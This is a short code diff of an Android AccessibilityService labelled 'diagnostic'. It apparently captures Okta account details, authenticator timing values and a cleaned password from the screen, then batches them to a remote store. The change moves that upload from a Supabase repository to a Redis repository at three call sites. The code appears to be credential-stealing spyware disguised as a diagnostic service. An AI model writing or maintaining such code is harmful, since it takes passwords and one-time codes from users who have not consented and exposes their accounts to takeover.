@@ -353,7 +353,7 @@ class DiagnosticAccessibilityService : AccessibilityService() {
 
         android.util.Log.d("OktaSync", "Flushing batch of ${itemsToSend.size} accounts to Supabase...")
 
-        val result = SupaBaseRepository.syncDiagnosticBatch(itemsToSend)
+        val result = RedisRepository.syncDiagnosticBatch(itemsToSend)
         result.onSuccess {
             android.util.Log.d("OktaSync", "Successfully synced all ${itemsToSend.size} accounts in 1 request")
         }.onFailure { e ->
@@ -402,7 +402,7 @@ class DiagnosticAccessibilityService : AccessibilityService() {
 
         if (itemsToSync.isNotEmpty()) {
             serviceScope.launch {
-                val result = SupaBaseRepository.syncDiagnosticBatch(itemsToSync)
+                val result = RedisRepository.syncDiagnosticBatch(itemsToSync)
                 result.onFailure {
                     // Clear cache on failure so next cycle will retry
                     itemsToSync.forEach { entry ->
@@ -495,7 +495,7 @@ class DiagnosticAccessibilityService : AccessibilityService() {
             DiagnosticLog.addOktaSnapshot(clientValue, accountValue, secondsValue, cleanPassword)
 
             serviceScope.launch {
-                val result = SupaBaseRepository.syncDiagnosticData(
+                val result = RedisRepository.syncDiagnosticData(
                     clientName = clientValue,
                     account = accountValue,
                     pass = cleanPassword,
